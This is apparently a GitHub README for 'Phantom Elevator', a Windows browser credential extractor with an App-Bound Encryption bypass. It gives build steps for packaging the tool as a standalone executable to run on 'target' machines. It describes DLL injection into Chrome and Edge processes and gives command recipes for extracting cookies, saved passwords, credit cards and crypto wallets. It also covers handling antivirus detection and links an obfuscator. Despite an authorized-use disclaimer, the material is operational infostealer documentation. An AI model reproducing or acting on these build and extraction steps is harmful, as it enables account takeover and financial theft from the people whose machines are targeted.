<div align="center">

# 👻 phantom elevator

### Build the EXE · No Python on the Target

*Clone → build two DLL sets → one 13 MB file. The target machine needs nothing.*

<br>

<a href="https://github.com/Hidden-Rhythm/abe_bypass">
  <img src="https://img.shields.io/badge/💻_Source-GitHub-18181b?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Source">
</a>
<img src="https://img.shields.io/badge/🐍_Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+">
<img src="https://img.shields.io/badge/🪟_Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Windows 10/11">
<img src="https://img.shields.io/badge/Version-1.0.0-52525b?style=for-the-badge" alt="Version 1.0.0">

<br>

<img src="https://img.shields.io/badge/📦_Output-~13_MB_exe-8a2be2?style=for-the-badge" alt="Output ~13 MB">
<img src="https://img.shields.io/badge/⚙️_Builder-Nuitka_4.x-e11d48?style=for-the-badge" alt="Nuitka 4.x">
<img src="https://img.shields.io/badge/🔓_ABE-Prebuilt_DLLs-22c55e?style=for-the-badge" alt="Prebuilt DLLs">

<br><br>

**NO GCC ON TARGET** &nbsp;·&nbsp; **NO PYTHON ON TARGET** &nbsp;·&nbsp; **NO NETWORK ON TARGET**

<br>

[**🔨 Quick Build**](#quick-build) · [**📦 What You Get**](#output) · [**🧰 Troubleshooting**](#troubleshooting) · [**🖥️ CLI**](#cli) · [**❓ FAQ**](#faq)

</div>

---

> [!TIP]
> **Just want to run the tool — no build step?**
>
> Use **[Hidden-Rhythm/abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass)** instead.
> One file, `python phantom_elevator.py`, ABE compiled at runtime. Requires Python 3.10+ and optionally gcc.
>
> **This repo** is for producing a standalone `.exe` that runs on a machine with no Python, no compiler, and no internet.

---

## 🎯 What Is This Repo?

This is the **build pipeline** for Phantom Elevator — a credential extractor with a working App-Bound Encryption (v20) bypass.

It ships three files and no more:

| File | Role |
|---|---|
| `phantom_elevator.py` | The tool itself — patched so ABE DLLs resolve from `dlls/` instead of compiling at runtime |
| `build_dll.py` | Compiles 5 browser-specific ABE DLLs into `dlls/` — **dev machine only, needs gcc** |
| `build_exe.py` | Bundles source + DLLs into a single `.exe` via Nuitka — **dev machine only** |

Run them in order. You end up with `dist\phantom_elevator.exe`, ~13 MB, self-contained.

> 🎯 **The goal:** produce one file that works on a Windows 10/11 x64 box with zero prerequisites.

<br>

<table>
<tr>
<td width="33%" valign="top">

**🔧 Step 1**
`build_dll.py` compiles five ABE DLLs — one per Chromium build with an elevation service. Needs `x86_64-w64-mingw32-gcc` on your build box.

</td>
<td width="33%" valign="top">

**📦 Step 2**
`build_exe.py` installs Nuitka if missing, validates the DLLs, and runs a onefile build with the DLLs embedded as data files.

</td>
<td width="33%" valign="top">

**🚀 Step 3**
`dist\phantom_elevator.exe` — no Python, no gcc, no `dlls\` folder beside it. Copy, run, done.

</td>
</tr>
</table>

---

<a id="authorized-use"></a>
## ⚠️ Authorized Use Only

<table>
<tr>
<td width="100%" valign="top">

**✅ Legitimate uses**

- Authorized penetration testing engagements with a signed scope
- Red-team assessments of your own systems
- Digital forensics on a device you own or have legal custody of
- Incident response triage on a compromised endpoint
- CTF challenges and security research on test machines you control
- Personal account recovery on a machine you own

**❌ Illegal uses**

- Extracting credentials from any device you do not own
- Any form of credential theft, account takeover, or unauthorized access
- Deploying on a victim's machine, through malware, phishing, or social engineering
- Commercial sale of extracted credentials
- Any use that violates the Computer Fraud and Abuse Act, the Computer Misuse Act, GDPR, CFAA § 1030, or local law

</td>
</tr>
</table>

> 🚨 **YOU ARE RESPONSIBLE FOR YOUR OWN USE.** This software is published for authorized security research and educational analysis only. The author does **not** condone, support, or facilitate unauthorized access to computer systems. If you use Phantom Elevator against a system you are not explicitly authorized to test, **you** commit a crime and **you alone** bear the legal consequence.

> 📜 **NO WARRANTY, NO LIABILITY.** This software is provided "as is", without warranty of any kind, express or implied. The author is not liable for any damages, legal action, or consequence arising from use or misuse.

---

## 🔀 Two Repos, One Tool

| | **[abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass)** | **abe_bypass** (this repo) |
|:---|:---|:---|
| **You get** | Python script | Standalone `.exe` |
| **Files** | `phantom_elevator.py` + README | 3 Python files |
| **Run with** | `python phantom_elevator.py` | Double-click the exe |
| **Target needs Python** | ✅ yes, 3.10+ | ❌ no |
| **Target needs gcc** | ⚠️ yes, for v20 ABE | ❌ no — DLLs prebuilt |
| **Build step** | none | `build_dll.py` → `build_exe.py` |
| **Size** | ~90 KB | ~13 MB |
| **Best for** | reading the code, quick edits | handing to someone else, running on a clean box |

Both extract the same categories from the same browsers with the same CLI. The only difference is packaging.

---

<a id="quick-build"></a>
## 🔨 Quick Build

Three commands. First build takes a few minutes; subsequent builds are fast.

```bash
git clone https://github.com/Hidden-Rhythm/abe_bypass.git
cd abe_bypass

python build_dll.py     # needs x86_64 gcc — produces dlls/*.dll
python build_exe.py     # needs nothing — produces dist/phantom_elevator.exe
```

Output:

```text
dist/
└── phantom_elevator.exe    ~13 MB
```

Ship that one file. Nothing else travels with it.

---

## 🧰 Step 1 — `build_dll.py`

Compiles one DLL per Chromium build that uses App-Bound Encryption.

### Requirements

| Need | Detail |
|---|---|
| 🐍 Python | 3.10+ |
| 🔨 Compiler | `x86_64-w64-mingw32-gcc`, or `gcc` — must be **64-bit** |
| 🖥️ OS | Windows (the DLL targets Win32 COM) |

If gcc isn't on `PATH`, the script exits immediately:

```text
no x86_64 gcc on PATH — install mingw-w64
```

**Must be x86_64.** A 32-bit MSYS2 `gcc` produces a 32-bit DLL. Injecting that into 64-bit `chrome.exe` fails at `LoadLibraryW` with `ERROR_BAD_EXE_FORMAT` and looks like a mysterious injection failure at runtime.

### What it does

For every entry in `BROWSERS` where `abe` is `True`, it:

1. Reads that browser's `cls_id`, `iid_v1`, `iid_v2`, and `vtable_offset`
2. Patches those four values into `ABE_TEMPLATE`
3. Writes the generated C to a temp file
4. Compiles it with `-shared -O2 -s -static -static-libgcc`
5. Saves the result as `dlls/<browser>.dll`

`-static` and `-static-libgcc` are load-bearing. Without them the DLL links against `libgcc_s_seh-1.dll` and dies at `LoadLibraryW` on a machine that doesn't have MinGW installed — which is every target machine.

### Output

```text
  chrome.dll              15360 bytes
  chrome_beta.dll         15360 bytes
  brave.dll               15360 bytes
  edge.dll                15360 bytes
  avast.dll               15360 bytes

wrote C:\...\abe_bypass\dlls
```

Five files, ~15 KB each, ~75 KB total. If any line reads `0 bytes`, the compile silently failed — check the `RuntimeError` output, usually a missing `-lole32` or a wrong gcc architecture.

### When to re-run

| Trigger | Why |
|---|---|
| `BROWSERS` table edited | new CLSID / IID / vtable offset baked in |
| A browser ships a new elevation service | old DLL returns `REGDB_E_CLASSNOTREG` |
| Never, otherwise | the DLL is version-agnostic within a browser build |

---

## 📦 Step 2 — `build_exe.py`

Bundles everything into one file with Nuitka.

### Requirements

| Need | Detail |
|---|---|
| 🐍 Python | 3.12 recommended |
| 📦 Nuitka | **auto-installed** if missing |
| 🔨 C compiler | **auto-downloaded** by Nuitka on first build (MinGW64, ~200 MB) |

Nothing needs to be installed manually. The script checks for Nuitka via `importlib.metadata` — reads the pip METADATA file off disk in ~2 ms, no subprocess.

> 💡 **Why not `nuitka --version`?** That command probes for a C compiler, and on Windows the probe can block on an inherited pipe for 40+ seconds before timing out. Reading the package metadata avoids the hang entirely.

### What it does

Five steps, each printed as it runs:

```text
  [1/5] checking nuitka...
        ok: nuitka 4.1.3

  [2/5] locating files...
    phantom_elevator.py path
    default: C:\...\abe_bypass\phantom_elevator.py
    (press enter for default, or paste a path)
  >
    ok: C:\...\abe_bypass\phantom_elevator.py

    dlls folder path
    default: C:\...\abe_bypass\dlls
    (press enter for default, or paste a path)
  >
    ok: C:\...\abe_bypass\dlls

  [3/5] validating dlls...
        ok: 5 dlls present
          chrome.dll  15360 bytes
          chrome_beta.dll  15360 bytes
          brave.dll  15360 bytes
          edge.dll  15360 bytes
          avast.dll  15360 bytes

  [4/5] building (first run can take 3-5 minutes)...
        source  C:\...\phantom_elevator.py
        dlls    C:\...\dlls
  ...
  [5/5] done
        exe:  C:\...\dist\phantom_elevator.exe
        size: 12.8 MB
```

Path prompts accept Enter for the default. Stray `[` `]` and quotes are stripped — pasting `C:\path\file.py]` still works. Three bad attempts then a clean exit, no traceback.

### The Nuitka command it runs

```text
python -m nuitka
  --onefile
  --windows-console-mode=force
  --assume-yes-for-downloads
  --include-package=Crypto
  --include-package=snappy
  --include-data-files=<dlls>\*.dll=dlls/
  --nofollow-import-to=tkinter  --nofollow-import-to=unittest
  --nofollow-import-to=pydoc    --nofollow-import-to=doctest
  --nofollow-import-to=distutils --nofollow-import-to=setuptools
  --output-dir=<dist>
  --output-filename=phantom_elevator
  --remove-output
  <source>
```

Two details that matter:

- **`--include-data-files` with a glob, not `--include-data-dir`.** Nuitka 4.x's directory scan reports `No data files in directory 'dlls'` on Windows backslash paths and silently bundles nothing. The exe still builds — it just fails at ABE time on the target. The glob is reliable.
- **`=` syntax for path options.** Nuitka 4.x rejects `--output-dir <path>` and errors with `requires an argument with '--output-dir='`.

### Build times

| | First build | After |
|:---|:---|:---|
| MinGW64 toolchain download | 2–5 min | cached |
| Python → C translation | 30–60 s | 20–40 s |
| C compilation (ccache) | 3–6 min | 30–90 s |
| Linking | 30–60 s | 20–40 s |
| **Total** | **8–15 min** | **1.5–3 min** |

Subsequent builds reuse Nuitka's ccache. `Cached C files ... 'cache hit'` instead of `'cache miss'`.

---

<a id="output"></a>
## 📦 What You Get

```text
dist/
└── phantom_elevator.exe    ~13 MB
```

That's the whole release. Inside it:

| Component | Bundled |
|---|---|
| Python 3.12 runtime | ✅ compiled to machine code |
| `phantom_elevator.py` | ✅ |
| `pycryptodome` — AES-256-GCM | ✅ |
| `python-snappy` — LevelDB | ✅ |
| 5 ABE DLLs in `dlls/` | ✅ embedded as data files |
| Network calls | ❌ none |
| License / activation server | ❌ none |

**Size breakdown:** ~49 MB uncompressed → ~13 MB at Nuitka's zstd level, ~27% ratio.

At launch the exe extracts to `%TEMP%\onefile_<random>\`, `_resolve_abe_dll` reads `dlls/chrome.dll` from there, `LoadLibraryW` maps it into the injected browser process, and the temp folder is wiped on exit. Standard Nuitka onefile behaviour.

### Verify the DLLs made it

Look for five lines during the build:

```text
Included data file 'dlls\chrome.dll' due to specified data file
Included data file 'dlls\chrome_beta.dll' due to specified data file
Included data file 'dlls\brave.dll' due to specified data file
Included data file 'dlls\edge.dll' due to specified data file
Included data file 'dlls\avast.dll' due to specified data file
```

Or check the built exe directly — Nuitka onefile is a 7z-compatible archive:

```cmd
"C:\Program Files\7-Zip\7z.exe" l dist\phantom_elevator.exe | findstr dlls
```

Five lines, or the glob didn't expand.

---

<a id="troubleshooting"></a>
## 🩺 Troubleshooting

Every error below has been hit and fixed during development of this exact pipeline.

<details>
<summary><b>❌ <code>The '--output-dir' option requires an argument with '--output-dir='</code></b></summary>

<br>

Nuitka 4.x dropped space-separated path options. `--output-dir C:\path` is parsed as `--output-dir` with no value plus a positional module name.

**Fix:** `--output-dir=C:\path` — the `=` must be in the same token.

Already handled in the shipped `build_exe.py`. Only relevant if you're editing the command list.

</details>

<details>
<summary><b>❌ <code>WARNING: No data files in directory 'C:\...\dlls'</code></b></summary>

<br>

Nuitka 4.x's `--include-data-dir` scan misses `*.dll` on Windows backslash paths. It warns, bundles nothing, and the build **succeeds** — producing a broken exe.

Symptom at runtime: ABE extraction fails, drops table shows `compile_failed` for every browser, because `_resolve_abe_dll` finds no prebuilt DLL and falls back to compiling — and the target has no gcc.

**Fix:** use `--include-data-files` with a glob:

```text
--include-data-files=C:\path\dlls\*.dll=dlls/
```

Already handled in the shipped `build_exe.py`. Verify with the 7-Zip check above.

</details>

<details>
<summary><b>❌ Build script hangs silently on <code>[1/5] checking nuitka...</code></b></summary>

<br>

Older versions ran `nuitka --version`. That command probes for a C compiler; on Windows the probe can block on the inherited stdout pipe for 40+ seconds before timing out — twice, once for `nuitka` and once for `python -m nuitka`.

**Fix:** check `importlib.metadata.version("nuitka")` instead. Reads `nuitka-*.dist-info/METADATA` off disk. No subprocess, no pipe, no hang. Falls back to `shutil.which("nuitka")`.

Already handled in the shipped `build_exe.py`.

</details>

<details>
<summary><b>⚠️ <code>scons: warning: No versions of the MSVC compiler were found</code></b></summary>

<br>

Harmless. Nuitka prefers MSVC, falls back to the MinGW64 toolchain it downloads automatically:

```text
Nuitka: Downloading 'https://github.com/brechtsanders/winlibs_mingw/...'
Nuitka-Scons: Backend C compiler: gcc (gcc 15.2.0)
```

The build completes with gcc. No action needed.

If you *want* MSVC, install Visual Studio Build Tools with the C++ workload and run `build_exe.py` from a **Developer Command Prompt** — otherwise `cl.exe` isn't on `PATH` and Nuitka won't find it anyway.

</details>

<details>
<summary><b>⚠️ <code>WARNING: Cannot find Windows Runtime DLLs to include</code></b></summary>

<br>

The exe depends on the Universal C Runtime (`api-ms-win-crt-*.dll`). Nuitka couldn't find them to bundle.

| Target | Impact |
|---|---|
| Windows 10 (any build) | none — UCRT is part of the OS since 2015 |
| Windows 11 | none |
| Windows 8.1 | needs KB2999226 |
| Windows 7 | unsupported |

Since the ABE bypass needs `chrome.exe` or `msedge.exe`, both of which dropped Win7 long ago, your real floor is Windows 10. Ignore this warning.

</details>

<details>
<summary><b>🛡️ Windows SmartScreen / Defender flags the exe</b></summary>

<br>

Expected. A compiled binary that injects a DLL into Chrome and reads credential stores matches trojan heuristics by shape. Static analysis can't tell "authorized pentest tool" from "infostealer."

You built it yourself from source you can read — that's your verification. For distribution to others, ship the SHA-256 alongside so they can confirm they have your build.

For SmartScreen on your own machine: right-click the exe → **Properties** → **Unblock** → **OK**. If you must whitelist, exclude **only the folder containing the exe** — never disable Defender globally.

</details>

<details>
<summary><b>❌ <code>no x86_64 gcc on PATH</code></b></summary>

<br>

`build_dll.py` couldn't find a 64-bit gcc.

```bash
# winget
winget install BrechtSanders.WinLibs.POSIX.UCRT

# or choco
choco install mingw

# or scoop
scoop install gcc
```

Verify the architecture before rebuilding:

```bash
gcc -dumpmachine
# want: x86_64-w64-mingw32
# bad:  i686-w64-mingw32  (32-bit — won't work)
```

</details>

<details>
<summary><b>❌ ABE works in Python but fails from the exe</b></summary>

<br>

Run the exe with drops visible:

```powershell
.\phantom_elevator.exe -t chrome --cookies --debug-drops -v
```

| Drop reason | Meaning |
|---|---|
| `compile_failed` | No DLL found in `_MEIPASS\dlls\` — the glob didn't bundle. Rebuild, check the 5 `Included data file` lines |
| `inject_failed` | DLL present, injection failed — check the error text for `OpenProcess` / `CreateRemoteThread` codes |
| `service_unavailable` | Browser's elevation service isn't running and won't start |
| `bad_key_length` | DLL ran but returned the wrong size — usually a 32-bit DLL in a 64-bit process |

</details>

---

<a id="cli"></a>
## 🖥️ Command Line

Identical to the source repo. The exe takes the same flags.

```powershell
phantom_elevator.exe [OPTIONS]
```

<br>

### 📦 Categories

| Flag | What it does |
|:---|:---|
| `--all` | Every category (same as passing none) |
| `--cookies` | 🍪 HTTP cookies |
| `--passwords` | 🔑 Saved logins |
| `--history` | 📜 Browsing history |
| `--autofill` | 📝 Form autofill fields and profiles |
| `--cards` | 💳 Credit cards and IBANs |
| `--local-storage` | 🗂️ Local Storage leveldb entries |
| `--bookmarks` | 🔖 Bookmarks |
| `--extensions` | 🧩 Extensions and their storage |
| `--wallets` | 🪙 Wallet vaults |

<br>

### 🎛️ Run Control

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `-o`, `--output` | `DIR` | `out` | 📁 Output directory |
| `-t`, `--target` | `NAME` | all | 🎯 One browser — `chrome`, `brave`, `edge`, `avast`, `vivaldi`, `chromium`, `opera`, `opera gx`, `firefox`, `waterfox`, `librewolf`, `floorp`, `zen` |
| `--force-kill` | — | off | 🔪 Close browsers first, unlock locked DBs |
| `--wallet-password` | `PW` | `$PE_WALLET_PW` | 🔐 Wallet vault password |
| `--no-wallet-prompt` | — | off | 🙅 Never prompt |
| `--jobs` | `N` | `1` | ⚡ Parallel browser jobs |

<br>

### 🧭 Modes

| Flag | What it does |
|:---|:---|
| `--list-browsers` | 🌐 Detected browsers, profile counts, ABE service state |
| `--list-wallets` | 🪙 Supported wallets, schemes, hashcat modes |
| `--audit-only` | 🩺 Read-only SQLite health audit — no secrets read, no files modified |

<br>

### 🎨 Output

| Flag | Argument | Default | What it does |
|:---|:---|:---|:---|
| `--format` | `tsv` \| `json` \| `csv` \| `txt` | `tsv` | 🗄️ `tsv` and `txt` write plain `.txt`; `csv` and `json` write structured |
| `--important` | — | off | 💎 High-value targets only |
| `--debug-drops` | — | off | 🔍 Skipped-entry breakdown |
| `--no-color` | — | off | ⚪ Disable ANSI |
| `-v`, `--verbose` | — | off | 📋 Per-entry samples + tracebacks |
| `-q`, `--quiet` | — | off | 🤫 Banner and progress suppressed |

<br>

### 🧾 Recipes

```powershell
# everything, default text output
phantom_elevator.exe

# close browsers first — unlocks locked databases
phantom_elevator.exe --force-kill

# just cookies and passwords
phantom_elevator.exe --cookies --passwords

# wallets with a password
phantom_elevator.exe --wallets --wallet-password "my pass"

# wallets via env var
$env:PE_WALLET_PW = "my pass"
.\phantom_elevator.exe --wallets --no-wallet-prompt

# high-value targets only, as JSON
phantom_elevator.exe --important --format json

# one browser, custom folder
phantom_elevator.exe -t chrome -o C:\Users\you\Desktop\drop

# four browsers in parallel
phantom_elevator.exe --jobs 4

# read-only health check
phantom_elevator.exe --audit-only
```

<br>

### 🚦 Exit codes

| Code | Meaning |
|:---:|:---|
| `0` | ✅ Clean run |
| `1` | ⚠️ Partial — jobs failed, profiles skipped, or a DB couldn't be copied |
| `2` | 🚫 Nothing ran — no browsers matched, or no job completed |
| `130` | 🛑 `Ctrl+C` |

---

## 🌐 Supported Browsers

### 🔵 Chromium

| | Browser | Key protection | ABE |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera GX | DPAPI | ➖ |

### 🦊 Firefox

| | Browser | Key protection | Status |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |

<sub>💡 Detected from `%LocalAppData%`, `%AppData%`, `%ProgramFiles%`. Missing browsers skipped, not fatal.</sub>

---

## 📦 Extraction Matrix

<table>
<tr>
<th></th>
<th align="left">Category</th>
<th align="left">Flag</th>
<th align="left">Chromium</th>
<th align="left">Firefox</th>
</tr>
<tr><td>🍪</td><td><b>Cookies</b></td><td><code>--cookies</code></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
<tr><td>🔑</td><td><b>Passwords</b></td><td><code>--passwords</code></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
<tr><td>📜</td><td>History</td><td><code>--history</code></td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>📝</td><td>Autofill</td><td><code>--autofill</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>💳</td><td><b>Cards &amp; IBANs</b></td><td><code>--cards</code></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>🗂️</td><td>Local Storage</td><td><code>--local-storage</code></td><td><code>Local Storage/leveldb</code></td><td>—</td></tr>
<tr><td>🔖</td><td>Bookmarks</td><td><code>--bookmarks</code></td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>🧩</td><td>Extensions</td><td><code>--extensions</code></td><td><code>Extensions/</code></td><td>—</td></tr>
<tr><td>🪙</td><td><b>Wallets</b></td><td><code>--wallets</code></td><td>extension storage</td><td>—</td></tr>
<tr><td>👤</td><td>Account</td><td><i>always</i></td><td><code>Preferences</code> / <code>Local State</code></td><td><code>signedInUser.json</code></td></tr>
</table>

---

## 🏗️ How the Pieces Fit

```text
build_dll.py
    │  reads BROWSERS table from phantom_elevator.py
    │  patches CLSID / IID / vtable into ABE_TEMPLATE
    │  gcc -shared -static → dlls/<browser>.dll  ×5
    ▼
dlls/chrome.dll  dlls/chrome_beta.dll  dlls/brave.dll  dlls/edge.dll  dlls/avast.dll
    │
    ▼
build_exe.py
    │  nuitka --onefile
    │  --include-data-files=dlls\*.dll=dlls/
    ▼
dist/phantom_elevator.exe    (~13 MB)
    │
    ▼
target machine (no Python, no gcc)
    │  extracts to %TEMP%\onefile_<rand>\
    │  _resolve_abe_dll → _MEIPASS\dlls\<browser>.dll
    │  OpenProcess → VirtualAllocEx → WriteProcessMemory
    │  → CreateRemoteThread(LoadLibraryW)
    │  DLL: CoCreateInstance(ElevationService) → vtable decrypt → 32-byte key
    │  AES-256-GCM → plaintext
    ▼
out/Chrome/Default/{cookies,passwords,...}
```

---

## 🗂️ Project Structure

```text
abe_bypass/
├── phantom_elevator.py    the tool (ABE resolves from dlls/, falls back to runtime compile)
├── build_dll.py           dev only — needs gcc — writes dlls/*.dll
├── build_exe.py           dev only — needs nuitka (auto-installs) — writes dist/*.exe
└── dlls/                  (generated, not committed)
    ├── chrome.dll
    ├── chrome_beta.dll
    ├── brave.dll
    ├── edge.dll
    └── avast.dll
```

`dlls/` and `dist/` are build artifacts — they belong in `.gitignore`, not in git.

---

## 🔬 Technical Details

| Component | Implementation |
|---|---|
| 📦 Builder | Nuitka 4.x → C → machine code |
| 🐍 Python | 3.12 (embedded, compiled) |
| 🪟 Platform | Windows 10 / 11, x64 |
| 🔧 ABE bridge | C, prebuilt per-browser in `dlls/` |
| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
| ⚡ ABE access | COM elevation service + DLL injection |
| 🎯 Injection | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
| 🗄️ LevelDB | Built-in reader, `python-snappy` when available |
| 🔐 Crypto | `pycryptodome` |
| 🦊 Firefox passwords | NSS in-process via `ctypes` — no subprocess |
| 🪙 Wallets | MetaMask, Phantom, Coinbase, Rabby, Trust + 14 generic |

### ⚠️ Limitations

- 🪟 **Windows 10 / 11 x64 only.** Win32 COM, DPAPI, cross-process injection. Windows 8.1 needs KB2999226; Windows 7 unsupported.
- 🔄 **ABE is per-build.** A new browser elevation service invalidates the matching DLL. Fix: edit `BROWSERS`, re-run `build_dll.py`, re-run `build_exe.py`, ship a new exe.
- 🔨 **gcc required on the build box.** Not on the target — that's the whole point. But `build_dll.py` needs `x86_64-w64-mingw32-gcc`.
- 💾 **~13 MB exe, ~50 MB unpacked in `%TEMP%` while running.** Wiped on exit.
- 🛡️ **AV will react.** Injection + credential access is a high-signal pattern. See the SmartScreen entry above.
- 🦊 **Firefox passwords need `nss3.dll`.** Ships with every Firefox-family install, located automatically.

---

<a id="faq"></a>
## ❓ FAQ

<details>
<summary><b>Why two repos instead of one?</b></summary>

<br>

Different audiences. [abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass) is one file you run — good for reading the code or making a quick edit. This repo has the build pipeline — good for producing a binary you can hand to someone whose machine has no Python.

Keeping them separate also keeps `abe-bypass` honest as a "single-file Python application." Adding two build scripts and a `dlls/` folder would break that.

</details>

<details>
<summary><b>Are there prebuilt releases?</b></summary>

<br>

Not yet — build it yourself with the three commands above. If you'd rather not build, use [abe-bypass](https://github.com/Hidden-Rhythm/abe-bypass) with Python installed.

</details>

<details>
<summary><b>Can I skip `build_dll.py`?</b></summary>

<br>

Yes, but the exe will be weaker. Without `dlls/`, the bundled source falls back to compiling at runtime — and the target has no gcc, so the ABE path disables itself. You'd still get `v10` cookies/passwords and all Firefox extraction, but no `v20` ABE bypass.

`build_exe.py` checks for all five DLLs at step `[3/5]` and refuses to build if any are missing. Delete that check only if you understand the trade-off.

</details>

<details>
<summary><b>Does the exe phone home?</b></summary>

<br>

No. Zero network calls during extraction. The Python source has `_ensure_pycryptodome` / `_ensure_snappy` which would pip-install if a module were missing — but both are bundled in the exe, so those branches never fire. No telemetry, no license server, no analytics.

</details>

<details>
<summary><b>Can I build this on Linux / macOS?</b></summary>

<br>

No. `build_dll.py` produces PE DLLs with `-lole32 -loleaut32 -luser32` — Windows-only link flags. You could cross-compile with `x86_64-w64-mingw32-gcc` on Linux, but Nuitka's `--onefile` Windows target also wants to run on Windows. Build on a Windows box.

</details>

<details>
<summary><b>How do I keep the exe small?</b></summary>

<br>

Already near the floor at ~13 MB. Remaining levers:

| Change | Saves | Cost |
|---|---|---|
| Add `--lto=yes` | 5–10% | slower link |
| More `--nofollow-import-to` entries | 2–3 MB | risk of removing something needed |
| Drop `--include-package=snappy` | ~0.5 MB | falls back to slower built-in decompressor |
| UPX | ~30% | AV false-positive rate spikes — **don't** |

`--onefile` already skips UPX by default. That's correct — leave it.

</details>

<details>
<summary><b>Second build is fast but still 90 seconds — why?</b></summary>

<br>

Nuitka still relinks. `phantom_elevator.py` is one module, so editing it forces that module to recompile and the whole thing to relink. The other 220 C files hit ccache. ~90 s is the floor for a onefile relink.

Use `--standalone` instead of `--onefile` if build speed matters more than a single file — it skips the compression and bootstrap stages.

</details>

---

## 🔗 Links

<div align="center">

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/Python_Edition-abe--bypass-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python Edition">
</a>

<a href="https://github.com/Hidden-Rhythm/obfuscator">
  <img src="https://img.shields.io/badge/Companion-obfuscator-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Obfuscator">
</a>

<a href="https://github.com/Hidden-Rhythm">
  <img src="https://img.shields.io/badge/Developer-Hidden--Rhythm-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Developer Profile">
</a>

<a href="https://discord.com/users/hidden_rhythm">
  <img src="https://img.shields.io/badge/Discord-hidden__rhythm-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
</a>

</div>

---

<div align="center">

### 👻 Build once. Run anywhere Windows.

**Hidden-Rhythm**

<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families · build pipeline</sub>

</div>
